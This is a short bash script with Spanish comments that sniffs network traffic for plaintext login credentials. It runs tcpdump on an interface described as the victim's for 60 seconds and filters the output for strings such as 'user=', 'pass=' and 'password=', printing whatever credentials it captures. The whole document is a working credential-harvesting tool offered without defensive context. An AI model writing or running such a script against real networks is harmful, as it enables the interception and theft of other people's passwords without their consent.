#!/bin/bash

INTERFACE="eth0" # Cambia según la interfaz de la víctima
DURATION=60      # Tiempo de captura en segundos

echo "[*] Capturando tráfico en $INTERFACE por $DURATION segundos..."
echo "[!] Buscando patrones de USER/PASS en la red..."

# Capturamos tráfico y buscamos cadenas comunes de login
# -A: Imprime en formato ASCII
# -l: Modo línea para grep
timeout $DURATION tcpdump -i $INTERFACE -A -l | grep -iE 'user=|pass=|pwd=|login=|password=' 2>/dev/null

echo "[*] Captura finalizada."